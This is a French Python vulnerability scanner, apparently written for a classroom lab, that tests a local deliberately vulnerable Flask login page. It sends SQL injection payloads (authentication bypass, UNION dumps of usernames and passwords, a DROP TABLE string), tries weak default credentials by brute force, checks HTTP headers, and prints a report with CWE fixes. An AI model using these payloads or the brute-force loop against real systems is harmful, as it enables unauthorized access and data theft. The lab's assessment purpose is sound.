#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  SCANNER_SQLI.PY — Scanner Vulnérabilités Flask              ║
║  Sortie compatible avec app.py (parse_evaluate)              ║
║  Sujet 2 — Étape ÉVALUER                                     ║
║                                                              ║
║  Usage dans l'onglet Évaluer de app.py :                     ║
║    Collez dans le terminal :                                  ║
║    python3 scanner_sqli.py http://127.0.0.1:5000             ║
║                                                              ║
║  Ou lancez directement :                                     ║
║    python3 scanner_sqli.py                                   ║
║                                                              ║
║  pip install requests                                        ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import requests
import time
from datetime import datetime

# ── Cible (argument ou valeur par défaut) ────────────────────
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
LOGIN  = TARGET.rstrip('/') + "/"

TIMEOUT = 5

# ── Payloads SQL Injection à tester ──────────────────────────
SQLI_PAYLOADS = [
    ("' OR '1'='1' --",         "' OR '1'='1' --"),
    ("' OR 1=1 --",             "x"),
    ("admin'--",                "x"),
    ("' OR '1'='1",             "' OR '1'='1"),
    ("\" OR \"1\"=\"1\" --",    "x"),
    ("' UNION SELECT username,password FROM users --", "x"),
    ("' OR 1=1#",               "x"),
    ("admin' /*",               "x"),
]

# ── Indicateurs de succès d'injection ────────────────────────
SUCCESS_SIGNALS = [
    "connexion réussie",
    "injection sql réussie",
    "bienvenue",
    "welcome",
    "utilisateurs trouvés",
    "mamolava",
    "izy",
]

FAIL_SIGNALS = [
    "incorrect",
    "invalide",
    "erreur",
]

def titre(msg):
    print(f"\n{'─'*60}")
    print(f"  {msg}")
    print('─'*60)

def log(niveau, msg):
    """Sortie formatée compatible avec parse_evaluate() de app.py."""
    prefixes = {
        "CRITIQUE": "+ VULN CRITIQUE  :",
        "HAUTE":    "+ VULN HAUTE     :",
        "MOYENNE":  "+ VULN MOYENNE   :",
        "INFO":     "- INFO           :",
        "OK":       "  [OK]           :",
        "NIKTO":    "+ nikto          :",
    }
    print(f"  {prefixes.get(niveau,'+')} {msg}")

def tester_connexion():
    """Vérifie que la cible est accessible."""
    titre("🔗 Vérification de la cible")
    try:
        r = requests.get(TARGET, timeout=TIMEOUT)
        log("INFO", f"Cible accessible — HTTP {r.status_code} — {TARGET}")
        log("INFO", f"Serveur : {r.headers.get('Server','Non déclaré')}")
        return True
    except Exception as e:
        log("CRITIQUE", f"Cible inaccessible : {e}")
        print("\n  → Lancez d'abord : python3 web_vulnerable.py")
        return False

def analyser_headers(r):
    """[V9] Vérifie les en-têtes de sécurité manquants."""
    titre("🔍 Test 1 — En-têtes de Sécurité HTTP")
    headers_requis = {
        "X-Frame-Options":        "Clickjacking possible",
        "X-Content-Type-Options": "MIME sniffing possible",
        "Content-Security-Policy":"XSS non bloqué par CSP",
        "X-XSS-Protection":       "Protection XSS navigateur absente",
        "Strict-Transport-Security":"HSTS absent (pas de HTTPS forcé)",
        "Referrer-Policy":        "Fuite de referrer possible",
    }
    manquants = 0
    for header, risque in headers_requis.items():
        if header not in r.headers:
            log("MOYENNE", f"En-tête manquant : {header} → {risque}")
            manquants += 1
        else:
            log("OK", f"{header} présent")

    if manquants >= 4:
        log("HAUTE", f"nikto: {manquants} en-têtes de sécurité absents — exposition aux attaques web")

def tester_sql_injection():
    """[V1] Test complet SQL Injection sur le formulaire /login."""
    titre("💉 Test 2 — SQL Injection (formulaire de connexion)")

    http = requests.Session()
    vulnérabilité_trouvée = False
    nb_payloads = len(SQLI_PAYLOADS)

    for i, (username_payload, password_payload) in enumerate(SQLI_PAYLOADS, 1):
        print(f"\n  [{i:02d}/{nb_payloads}] Payload : username='{username_payload[:40]}'")
        try:
            resp = http.post(
                LOGIN,
                data={"username": username_payload, "password": password_payload},
                timeout=TIMEOUT,
                allow_redirects=True
            )
            texte = resp.text.lower()

            succes = any(s in texte for s in SUCCESS_SIGNALS)
            echec  = any(f in texte for f in FAIL_SIGNALS)

            if succes:
                vulnérabilité_trouvée = True
                # Vérifier si plusieurs lignes de données sont retournées (dump)
                if "utilisateurs trouvés" in texte or "mamolava" in texte:
                    log("CRITIQUE",
                        f"SQL Injection réussie — DUMP COMPLET de la base de données !")
                    log("CRITIQUE",
                        f"sql injection: tous les utilisateurs exposés via payload : "
                        f"username='{username_payload[:50]}'")
                    log("CRITIQUE",
                        f"Données sensibles visibles : username + password (non chiffré)")
                else:
                    log("CRITIQUE",
                        f"SQL Injection réussie — authentification contournée !")
                    log("HAUTE",
                        f"sql injection bypass: login contourné avec payload "
                        f"'{username_payload[:50]}'")
            elif not echec:
                log("MOYENNE",
                    f"Réponse ambiguë — vérification manuelle recommandée")
            else:
                log("INFO", f"Payload rejeté (réponse normale)")

        except Exception as e:
            log("INFO", f"Erreur réseau : {e}")

        time.sleep(0.1)

    if vulnérabilité_trouvée:
        log("CRITIQUE",
            "sql injection confirmée : requête non paramétrée dans le code Flask")
        log("CRITIQUE",
            "CVE-TYPE: CWE-89 — Improper Neutralization of SQL Commands")
        log("HAUTE",
            "injection: mots de passe stockés en CLAIR dans la base de données SQLite")
    else:
        log("OK", "Aucune SQL Injection détectée avec les payloads testés")

    return vulnérabilité_trouvée

def tester_exposition_donnees():
    """[V8] Vérifie si des données sensibles sont exposées."""
    titre("🔓 Test 3 — Exposition de Données Sensibles")
    try:
        r = requests.get(TARGET, timeout=TIMEOUT)
        texte = r.text.lower()

        # Vérifier si la page login expose des infos
        if "traceback" in texte or "exception" in texte:
            log("HAUTE", "vuln: stack trace Python exposée dans la réponse HTTP")

        if "debug" in r.headers.get("Server","").lower():
            log("HAUTE", "vuln: mode debug Flask détecté dans les en-têtes")

        # Tester /console (debugger Werkzeug)
        try:
            rc = requests.get(TARGET.rstrip('/') + "/console", timeout=3)
            if rc.status_code == 200 and "werkzeug" in rc.text.lower():
                log("CRITIQUE", "vuln: console Werkzeug accessible — RCE possible !")
        except:
            log("OK", "Console Werkzeug non exposée")

        # Chercher des infos dans la page principale
        r2 = requests.get(LOGIN, timeout=TIMEOUT)
        if "users.db" in r2.text:
            log("MOYENNE", "vuln: chemin de la base de données exposé dans la page HTML")
            log("INFO", "Indication trouvée : 'users.db' visible dans le code source")

        if "non chiffré" in r2.text or "non chiffre" in r2.text.lower():
            log("HAUTE", "vuln: indication que les mots de passe sont stockés en clair")

        if "sql injection" in r2.text.lower():
            log("INFO", "Page indique explicitement la vulnérabilité SQL Injection")

    except Exception as e:
        log("INFO", f"Test exposition données : {e}")

def tester_brute_force():
    """[V7] Vérifie l'absence de rate-limiting."""
    titre("🔑 Test 4 — Brute Force (absence de rate-limiting)")

    http = requests.Session()
    identifiants_faibles = [
        ("admin","admin"), ("admin","1234"), ("admin","password"),
        ("root","root"),   ("test","test"),  ("user","user"),
    ]

    nb_ok = 0
    debut = time.time()

    for user, pwd in identifiants_faibles:
        try:
            r = http.post(LOGIN, data={"username":user,"password":pwd}, timeout=TIMEOUT)
            texte = r.text.lower()
            if any(s in texte for s in SUCCESS_SIGNALS):
                log("HAUTE", f"vuln: login trouvé par dictionnaire → {user}:{pwd}")
                nb_ok += 1
        except: pass
        time.sleep(0.05)

    duree = time.time() - debut
    vitesse = len(identifiants_faibles) / duree

    log("MOYENNE",
        f"vuln: {len(identifiants_faibles)} requêtes en {duree:.1f}s "
        f"({vitesse:.0f} req/s) — aucun blocage IP détecté")
    log("MOYENNE",
        "vuln: absence de rate-limiting — brute force possible sur /login")
    log("INFO",
        "nikto: no rate limiting detected on authentication endpoint")

def tester_erreurs_sql():
    """Teste si les erreurs SQL sont exposées."""
    titre("⚠️  Test 5 — Exposition des Erreurs SQL")
    try:
        payloads_erreur = ["'", "\"", "' AND 1=2 --", "'; DROP TABLE users;--"]
        for p in payloads_erreur:
            r = requests.post(LOGIN, data={"username":p,"password":"x"}, timeout=TIMEOUT)
            texte = r.text.lower()
            if "sqlite" in texte or "syntax error" in texte or "operational error" in texte:
                log("HAUTE", f"vuln: erreur SQL exposée dans la réponse → fuite d'information")
                log("HAUTE", f"sql injection: message d'erreur SQLite visible avec payload '{p}'")
                break
            elif "erreur serveur" in texte:
                log("MOYENNE", "vuln: message d'erreur générique (erreur serveur) exposé")
    except Exception as e:
        log("INFO", f"Test erreurs SQL : {e}")

def rapport_final(sqli_trouvee):
    """Affiche le résumé compatible avec parse_evaluate()."""
    titre("📋 RÉSUMÉ — Rapport Scanner Flask SQLi")
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    print(f"""
  ┌─────────────────────────────────────────────────────┐
  │  Scanner : scanner_sqli.py (Sujet 2)                │
  │  Cible   : {TARGET:<40} │
  │  Date    : {now:<40} │
  └─────────────────────────────────────────────────────┘

  VULNÉRABILITÉS TROUVÉES :""")

    if sqli_trouvee:
        print("""
  🔴 CRITIQUE — SQL Injection (CWE-89)
     Fichier : web_vulnerable.py ligne ~50
     Cause   : f"...WHERE username='{username}'..." (concaténation)
     Impact  : Dump complet de la BD, bypass authentification
     Fix     : Requête paramétrée → execute(query, (username,))

  🟠 HAUTE — Mots de passe non chiffrés (CWE-312)
     Cause   : INSERT INTO users VALUES (username, password_plain)
     Impact  : Exposition totale si SQLi ou accès au fichier .db
     Fix     : generate_password_hash() + check_password_hash()

  🟡 MOYENNE — Absence de rate-limiting (CWE-307)
     Cause   : Aucun compteur de tentatives sur /login
     Impact  : Brute force possible sans limitation
     Fix     : Compteur IP + blocage après N échecs

  🟡 MOYENNE — En-têtes de sécurité manquants (CWE-693)
     Cause   : Flask par défaut, aucun middleware de sécurité
     Impact  : Clickjacking, XSS, MIME sniffing
     Fix     : @app.after_request → ajouter les en-têtes HTTP

  📌 SCORE DE RISQUE GLOBAL : CRITIQUE (9.1/10)
  📌 CVSS Base Score         : 9.8 (SQL Injection + données en clair)""")
    else:
        print("""
  ✅ Aucune SQL Injection confirmée sur cette cible.
  → Vérifiez que web_vulnerable.py est lancé sur le port 5000.""")

    print(f"""
  ─────────────────────────────────────────────────────
  + nikto rapport terminé — {TARGET}
  - Fin du scan : {now}
  ─────────────────────────────────────────────────────
""")

# ══════════════════════════════════════════════════════════════
#  POINT D'ENTRÉE
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 62)
    print("  🔍  SCANNER VULNÉRABILITÉS FLASK — Compatible app.py")
    print(f"  🎯  Cible : {TARGET}")
    print(f"  🕐  Début : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 62)

    if not tester_connexion():
        sys.exit(1)

    try:
        r0 = requests.get(TARGET, timeout=TIMEOUT)
        analyser_headers(r0)
    except: pass

    sqli = tester_sql_injection()
    tester_exposition_donnees()
    tester_brute_force()
    tester_erreurs_sql()
    rapport_final(sqli)
